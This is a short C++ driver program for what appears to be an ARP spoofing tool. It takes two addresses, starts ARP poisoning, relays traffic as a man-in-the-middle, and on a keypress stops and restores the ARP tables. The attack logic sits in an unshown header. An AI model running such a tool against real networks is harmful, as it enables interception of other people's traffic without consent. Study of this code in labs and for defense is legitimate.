#include <stdio.h>
#include "arpspoofing.h"

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Invaild Arguments.\n");
        exit(1);
    }

    ARPSpoofing ArpSpoofer = ARPSpoofing();

    ArpSpoofer.Init(argv[1], argv[2]);

    ArpSpoofer.Attack();
    printf(">> Attack started.\n");

    ArpSpoofer.Relay();
    printf(">> Relay Running...\n");

    getchar();

    ArpSpoofer.Attack_Stop();
    printf(">> Attack Stopping...\n");

    ArpSpoofer.Relay_Stop();
    printf(">> Relay Stopping...\n");

    ArpSpoofer.Recover();
    printf(">> ARP table have been recovered.\n");

    return 0;
}
